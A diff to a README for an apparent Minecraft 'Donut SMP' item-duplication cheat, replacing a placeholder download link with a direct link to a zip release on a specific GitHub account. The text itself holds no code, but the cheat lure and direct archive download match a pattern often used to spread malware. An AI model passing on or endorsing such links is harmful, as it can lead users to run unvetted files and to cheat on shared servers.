@@ -17,7 +17,7 @@ Fast setup. Simple steps. Infinite items.
 
 ## ⬇️ Download
 
-### [👉 Download Latest Release](https://github.com/YOUR_USERNAME/YOUR_REPO/releases/latest)
+### [👉 Download Latest Release](https://github.com/HubMicraRu/Donut-SMP-DUPE-Glitch-2026/releases/download/1.2/Donut.SMP.DUPE.AUTO.zip)
 
 Or use the button on the right → **Releases** → download the newest `.zip`
 
